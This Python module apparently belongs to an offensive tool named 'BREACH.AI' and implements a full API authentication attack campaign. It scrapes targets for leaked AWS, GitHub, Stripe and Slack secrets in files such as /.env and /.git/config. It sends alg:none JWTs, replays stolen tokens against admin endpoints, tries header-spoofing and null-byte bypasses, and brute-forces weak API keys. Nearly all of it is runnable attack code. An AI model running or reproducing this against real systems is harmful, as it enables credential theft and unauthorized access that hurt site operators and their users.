"""
BREACH.AI - API Auth Breaker

Comprehensive API authentication attack module.
API auth is different from web auth - we break it differently.

Attack Categories:
1. API Key Leakage - Find exposed keys
2. Broken Authentication - Bypass API auth
3. JWT API Attacks - Specific to API JWT usage
4. Bearer Token Abuse - Steal and reuse tokens
5. API Key Privilege Escalation - Abuse key scopes
6. Unauthenticated Access - Find unprotected endpoints
7. Authentication Confusion - Mixed auth methods
"""

import base64
import json
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class APICredential:
    """Discovered API credential."""
    type: str  # api_key, bearer_token, jwt, basic
    value: str
    location: str  # where it was found
    scope: Optional[str] = None


class APIAuthBreaker(BaseAttack):
    """
    API AUTH BREAKER - Comprehensive API authentication exploitation.

    API authentication has unique vulnerabilities:
    - Keys leaked in client-side code
    - Tokens exposed in URLs
    - Missing authentication on endpoints
    - Weak key generation

    We exploit them all.
    """

    name = "API Auth Breaker"
    attack_type = "api_auth_attack"
    description = "Comprehensive API authentication exploitation"
    severity = Severity.CRITICAL
    owasp_category = "API Security - Broken Authentication"
    cwe_id = 287

    # Patterns to find API keys in code
    API_KEY_PATTERNS = [
        # Generic API keys
        r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'apikey["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'api_secret["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',

        # Bearer tokens
        r'bearer["\s:]+([a-zA-Z0-9_.-]{20,})',
        r'authorization["\s:=]+["\']?bearer\s+([a-zA-Z0-9_.-]+)["\']?',

        # AWS
        r'AKIA[0-9A-Z]{16}',
        r'aws_secret_access_key["\s:=]+["\']?([a-zA-Z0-9/+=]{40})["\']?',

        # Google
        r'AIza[0-9A-Za-z_-]{35}',

        # GitHub
        r'gh[ps]_[0-9a-zA-Z]{36}',
        r'github_pat_[0-9a-zA-Z_]{22,}',

        # Stripe
        r'sk_live_[0-9a-zA-Z]{24,}',
        r'pk_live_[0-9a-zA-Z]{24,}',

        # Slack
        r'xox[baprs]-[0-9a-zA-Z-]+',

        # Generic secrets
        r'secret[_-]?key["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'private[_-]?key["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'client[_-]?secret["\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
    ]

    # Common unauthenticated endpoints
    UNAUTH_ENDPOINTS = [
        "/api/health",
        "/api/status",
        "/api/version",
        "/api/config",
        "/api/debug",
        "/api/docs",
        "/api/swagger",
        "/api/graphql",
        "/api/users",
        "/api/search",
        "/api/public",
        "/internal/",
        "/debug/",
        "/_debug/",
    ]

    # Files that commonly contain API keys
    KEY_LEAK_FILES = [
        "/config.js",
        "/app.js",
        "/main.js",
        "/bundle.js",
        "/env.js",
        "/.env",
        "/config.json",
        "/settings.json",
        "/api/config",
        "/.git/config",
        "/package.json",
        "/composer.json",
    ]

    def get_payloads(self) -> list[str]:
        return self.UNAUTH_ENDPOINTS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if target has API authentication."""
        response = await self.http_client.get(url)

        auth_indicators = [
            "api", "key", "token", "bearer",
            "authorization", "authenticate", "401",
        ]

        return any(ind in response.body.lower() for ind in auth_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive API authentication attacks."""
        result = self._create_result(False, url, parameter)

        discovered_creds: list[APICredential] = []

        logger.info("[APIAuth] Starting API authentication attack campaign...")

        # Attack 1: API Key Discovery
        key_result = await self._attack_key_discovery(url)
        if key_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = key_result["key"][:20] + "..."
            result.details = f"API key leaked: {key_result['type']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "api_key_leak",
                f"API key found in {key_result['location']}",
                key_result["key"][:50] + "..."
            )

            discovered_creds.append(APICredential(
                type=key_result["type"],
                value=key_result["key"],
                location=key_result["location"]
            ))

        # Attack 2: Unauthenticated Endpoint Discovery
        unauth_result = await self._attack_unauth_endpoints(url)
        if unauth_result:
            result.success = True
            result.details = f"Unauth endpoints: {len(unauth_result['endpoints'])}"
            result.add_evidence(
                "api_unauth_access",
                "Endpoints accessible without authentication",
                ", ".join(unauth_result["endpoints"][:10])
            )

        # Attack 3: JWT in API Context
        jwt_result = await self._attack_jwt_api(url)
        if jwt_result:
            result.success = True
            result.severity = Severity.HIGH
            result.details = f"JWT API vulnerability: {jwt_result['type']}"
            result.add_evidence(
                "api_jwt_vuln",
                jwt_result["type"],
                jwt_result["details"]
            )

        # Attack 4: Bearer Token Abuse
        bearer_result = await self._attack_bearer_abuse(url, discovered_creds)
        if bearer_result:
            result.success = True
            result.access_gained = AccessLevel.USER
            result.details = f"Bearer token abuse: {bearer_result['type']}"
            result.add_evidence(
                "api_bearer_abuse",
                bearer_result["type"],
                bearer_result["details"]
            )

        # Attack 5: API Key Scope Abuse
        scope_result = await self._attack_key_scope(url, discovered_creds)
        if scope_result:
            result.success = True
            result.access_gained = AccessLevel.ADMIN
            result.details = "API key privilege escalation"
            result.add_evidence(
                "api_scope_escalation",
                "API key has excessive permissions",
                scope_result["details"]
            )

        # Attack 6: Authentication Bypass
        bypass_result = await self._attack_auth_bypass(url)
        if bypass_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.access_gained = AccessLevel.USER
            result.details = f"Auth bypass: {bypass_result['method']}"
            result.add_evidence(
                "api_auth_bypass",
                bypass_result["method"],
                bypass_result["details"]
            )

        # Attack 7: API Key Brute Force (short keys only)
        brute_result = await self._attack_key_bruteforce(url)
        if brute_result:
            result.success = True
            result.payload = brute_result["key"]
            result.details = "API key brute forced!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "api_key_bruteforce",
                "Weak API key discovered via brute force",
                brute_result["key"]
            )

        # Attack 8: Mixed Auth Confusion
        confusion_result = await self._attack_auth_confusion(url)
        if confusion_result:
            result.success = True
            result.details = f"Auth confusion: {confusion_result['type']}"
            result.add_evidence(
                "api_auth_confusion",
                "Multiple auth methods create bypass opportunity",
                confusion_result["details"]
            )

        return result

    async def _attack_key_discovery(self, url: str) -> Optional[dict]:
        """Search for exposed API keys."""
        logger.debug("[APIAuth] Searching for exposed API keys...")

        for file_path in self.KEY_LEAK_FILES:
            try:
                full_url = urljoin(url, file_path)
                response = await self.http_client.get(full_url)

                if response.status_code == 200:
                    # Search for API keys in response
                    for pattern in self.API_KEY_PATTERNS:
                        match = re.search(pattern, response.body, re.I)
                        if match:
                            key = match.group(1) if match.lastindex else match.group(0)

                            # Validate it looks like a real key (not placeholder)
                            if not self._is_placeholder(key):
                                key_type = self._identify_key_type(key, pattern)
                                logger.info(f"[APIAuth] Found {key_type} key in {file_path}")

                                return {
                                    "key": key,
                                    "type": key_type,
                                    "location": file_path,
                                    "pattern": pattern
                                }

            except Exception:
                continue

        # Also check main page and JS files
        response = await self.http_client.get(url)
        for pattern in self.API_KEY_PATTERNS:
            match = re.search(pattern, response.body, re.I)
            if match:
                key = match.group(1) if match.lastindex else match.group(0)
                if not self._is_placeholder(key):
                    return {
                        "key": key,
                        "type": self._identify_key_type(key, pattern),
                        "location": "main page",
                        "pattern": pattern
                    }

        return None

    def _is_placeholder(self, key: str) -> bool:
        """Check if key is a placeholder."""
        placeholders = [
            "your_api_key", "xxx", "example", "placeholder",
            "insert", "here", "change", "replace", "todo",
            "aaaa", "0000", "1234", "test", "demo",
        ]
        key_lower = key.lower()
        return any(p in key_lower for p in placeholders)

    def _identify_key_type(self, key: str, pattern: str) -> str:
        """Identify the type of API key."""
        if key.startswith("AKIA"):
            return "AWS Access Key"
        if key.startswith("AIza"):
            return "Google API Key"
        if key.startswith("gh"):
            return "GitHub Token"
        if key.startswith("sk_live") or key.startswith("pk_live"):
            return "Stripe Key"
        if key.startswith("xox"):
            return "Slack Token"
        if "bearer" in pattern.lower():
            return "Bearer Token"
        if "jwt" in pattern.lower() or key.startswith("eyJ"):
            return "JWT Token"
        return "API Key"

    async def _attack_unauth_endpoints(self, url: str) -> Optional[dict]:
        """Find unauthenticated API endpoints."""
        logger.debug("[APIAuth] Finding unauthenticated endpoints...")

        accessible = []

        for endpoint in self.UNAUTH_ENDPOINTS:
            try:
                full_url = urljoin(url, endpoint)
                response = await self.http_client.get(full_url)

                if response.status_code == 200:
                    # Check if it's not just an error page
                    error_indicators = ["not found", "error", "404", "unauthorized"]
                    if not any(ind in response.body.lower() for ind in error_indicators):
                        accessible.append(endpoint)

            except Exception:
                continue

        if accessible:
            return {"endpoints": accessible}

        return None

    async def _attack_jwt_api(self, url: str) -> Optional[dict]:
        """Test for JWT vulnerabilities in API context."""
        logger.debug("[APIAuth] Testing JWT in API context...")

        api_endpoints = ["/api/me", "/api/user", "/api/profile", "/api/account"]

        for endpoint in api_endpoints:
            full_url = urljoin(url, endpoint)

            # Test with invalid JWT
            invalid_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

            try:
                response = await self.http_client.get(
                    full_url,
                    headers={"Authorization": f"Bearer {invalid_jwt}"}
                )

                if response.status_code == 200:
                    return {
                        "type": "JWT algorithm:none accepted",
                        "details": f"Endpoint {endpoint} accepts JWT with alg:none"
                    }

                # Check for detailed JWT errors
                if "jwt" in response.body.lower() or "token" in response.body.lower():
                    if "expired" in response.body.lower():
                        return {
                            "type": "JWT expiration not enforced",
                            "details": "JWT expiration check can be bypassed"
                        }

            except Exception:
                continue

        return None

    async def _attack_bearer_abuse(
        self,
        url: str,
        creds: list[APICredential]
    ) -> Optional[dict]:
        """Test bearer token abuse scenarios."""
        logger.debug("[APIAuth] Testing bearer token abuse...")

        # If we found any tokens, test them
        for cred in creds:
            if cred.type in ["Bearer Token", "JWT Token"]:
                # Test token on admin endpoints
                admin_endpoints = ["/api/admin", "/api/users", "/api/internal"]

                for endpoint in admin_endpoints:
                    full_url = urljoin(url, endpoint)

                    try:
                        response = await self.http_client.get(
                            full_url,
                            headers={"Authorization": f"Bearer {cred.value}"}
                        )

                        if response.status_code == 200:
                            return {
                                "type": "Token scope too broad",
                                "details": f"Token from {cred.location} grants access to {endpoint}"
                            }

                    except Exception:
                        continue

        return None

    async def _attack_key_scope(
        self,
        url: str,
        creds: list[APICredential]
    ) -> Optional[dict]:
        """Test API key scope/privilege escalation."""
        logger.debug("[APIAuth] Testing API key scope abuse...")

        # Test found keys on privileged endpoints
        privileged_endpoints = [
            "/api/admin/users",
            "/api/admin/config",
            "/api/internal/secrets",
            "/api/system/settings",
        ]

        for cred in creds:
            for endpoint in privileged_endpoints:
                full_url = urljoin(url, endpoint)

                # Try different auth header formats
                headers_list = [
                    {"X-API-Key": cred.value},
                    {"Authorization": f"Bearer {cred.value}"},
                    {"Api-Key": cred.value},
                    {"apikey": cred.value},
                ]

                for headers in headers_list:
                    try:
                        response = await self.http_client.get(full_url, headers=headers)

                        if response.status_code == 200:
                            return {
                                "details": f"Key from {cred.location} grants admin access to {endpoint}"
                            }

                    except Exception:
                        continue

        return None

    async def _attack_auth_bypass(self, url: str) -> Optional[dict]:
        """Test for authentication bypass vulnerabilities."""
        logger.debug("[APIAuth] Testing authentication bypass...")

        api_endpoints = ["/api/users", "/api/data", "/api/admin"]

        bypass_techniques = [
            # Empty auth
            ({"Authorization": ""}, "Empty Authorization"),
            ({"Authorization": "Bearer "}, "Empty Bearer"),
            ({"X-API-Key": ""}, "Empty API Key"),

            # Null bytes
            ({"Authorization": "Bearer \x00admin"}, "Null byte injection"),

            # Case manipulation
            ({"AUTHORIZATION": "test"}, "Header case bypass"),

            # Double headers (some parsers take first, others last)
            ({"Authorization": "invalid", "authorization": "Bearer admin"}, "Double header"),

            # Internal bypass
            ({"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For localhost"),
            ({"X-Real-IP": "127.0.0.1"}, "X-Real-IP localhost"),
            ({"X-Original-URL": "/api/public"}, "X-Original-URL bypass"),
        ]

        for endpoint in api_endpoints:
            full_url = urljoin(url, endpoint)

            # Get baseline (should be 401/403)
            baseline = await self.http_client.get(full_url)

            if baseline.status_code not in [401, 403]:
                continue

            for headers, technique in bypass_techniques:
                try:
                    response = await self.http_client.get(full_url, headers=headers)

                    if response.status_code == 200:
                        return {
                            "method": technique,
                            "details": f"Bypassed auth on {endpoint} using {technique}"
                        }

                except Exception:
                    continue

        return None

    async def _attack_key_bruteforce(self, url: str) -> Optional[dict]:
        """Attempt API key brute force (only for weak keys)."""
        logger.debug("[APIAuth] Testing for weak API keys...")

        # Only try very common/weak keys
        weak_keys = [
            "test", "demo", "admin", "api", "key",
            "1234", "12345", "123456",
            "password", "secret", "apikey",
            "development", "staging", "production",
        ]

        test_endpoints = ["/api/users", "/api/data", "/api/health"]

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            for key in weak_keys:
                headers_list = [
                    {"X-API-Key": key},
                    {"Authorization": f"Bearer {key}"},
                    {"Api-Key": key},
                ]

                for headers in headers_list:
                    try:
                        response = await self.http_client.get(full_url, headers=headers)

                        if response.status_code == 200:
                            # Verify it's not just a public endpoint
                            no_auth_response = await self.http_client.get(full_url)
                            if no_auth_response.status_code != 200:
                                return {
                                    "key": key,
                                    "endpoint": endpoint,
                                    "header": list(headers.keys())[0]
                                }

                    except Exception:
                        continue

        return None

    async def _attack_auth_confusion(self, url: str) -> Optional[dict]:
        """Test for authentication confusion vulnerabilities."""
        logger.debug("[APIAuth] Testing authentication confusion...")

        test_endpoint = urljoin(url, "/api/users")

        # Test conflicting auth methods
        confusion_tests = [
            # Cookie vs Header
            {
                "headers": {"Authorization": "Bearer invalid"},
                "cookies": {"session": "admin"},
                "type": "Cookie overrides invalid header"
            },
            # Multiple auth headers
            {
                "headers": {
                    "Authorization": "Bearer invalid",
                    "X-API-Key": "test",
                },
                "type": "Multiple auth headers"
            },
            # Basic vs Bearer
            {
                "headers": {
                    "Authorization": "Basic " + base64.b64encode(b"admin:admin").decode(),
                },
                "type": "Basic auth accepted"
            },
        ]

        for test in confusion_tests:
            try:
                response = await self.http_client.get(
                    test_endpoint,
                    headers=test.get("headers", {})
                )

                if response.status_code == 200:
                    return {
                        "type": test["type"],
                        "details": f"Authentication confusion: {test['type']}"
                    }

            except Exception:
                continue

        return None
